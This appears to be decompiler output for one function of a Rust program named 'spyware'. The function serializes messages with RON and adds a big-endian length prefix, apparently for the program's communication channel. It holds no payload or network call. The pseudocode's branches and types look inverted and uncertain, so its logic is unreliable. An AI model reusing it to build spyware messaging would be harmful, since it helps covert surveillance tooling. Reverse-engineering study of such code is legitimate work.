fn spyware::communication::serialization::serialize_message(a1: i64) -> : struct24 {
    let a0: i64;  // rdi
    let v0: struct28;  // [bp-0xac]
    let v1: Result<struct48, struct28>;  // [bp-0xa8], Other Possible Types: struct8
    let v2: struct48;  // [bp-0xa8]
    let v3: u64;  // [bp-0x90]
    let v4: struct24;  // [bp-0x78]
    let v5: struct32;  // [bp-0x58], Other Possible Types: struct48, u32
    let v7: u64;  // r15
    let v8: u64;  // rdx
    let v9: u64;  // rcx
    let v11: void*;  // rax
    let v12: alloc::raw_vec::RawVecInner<alloc::alloc::Global>;  // rax:rdx

    v1 = ron::ser::to_string(a1);
    match v1 {
        Ok(v5) => {
            spyware::communication::serialization::serialize_message::{{closure}}(&v5); /* do not return */
        },
        Err(_) => {
            v7 = v3;
            v4 = struct24 {
                field_0: *((&v1 as &char + 8) as &i128)
                field_16: v7
            };
            v12 = alloc::raw_vec::RawVecInner<A>::with_capacity_in(v7 + 4, a1, v8, v9);
            v0 = struct28 {
                field_0: 0
                field_4: v12.cap.field_16
                field_12: v12.ptr.pointer.pointer
                field_20: 0
            };
            v11 = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index_mut(&v0);
            v5 = __buildin_bswap32(v7 as u32);
            core::slice::<impl [T]>::copy_from_slice(v11, 4, &v5 as u128, 4, "/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/byteorder-1.5.0/src/lib.rs");
            std::io::impls::<impl std::io::Write for alloc::vec::Vec<u8,A>>::write_all(&v0 as u64, &v0, v8);
            v5 = <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v4);
            v1 = <alloc::vec::Vec<T,A> as alloc::vec::spec_extend::SpecExtend<T,alloc::vec::into_iter::IntoIter<T>>>::spec_extend(&v5, "src/communication/serialization.rs");
            return struct24 {
                field_0: *(&(&v0.field_0)[1] as &i128)
                field_16: 0
            };
        },
    }
}
